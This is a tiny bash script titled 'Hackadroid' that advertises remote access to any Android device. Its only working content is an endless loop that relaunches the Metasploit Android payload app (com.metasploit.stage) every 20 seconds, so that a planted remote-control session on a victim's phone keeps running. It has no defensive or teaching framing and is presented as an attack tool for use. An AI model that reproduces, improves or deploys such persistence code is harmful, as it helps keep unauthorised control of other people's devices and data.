
#!/bin/bash

#################### HACKADROID ######################
# Project - Hackadroid
# access any android devices remotely               
# Author: Ashish Singh (ashishsingh103020@gmail.com)
# Date: 25 Dec 2020
# Copyright (c) 2020
######################################################

while true
do am start –user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
sleep 20
done
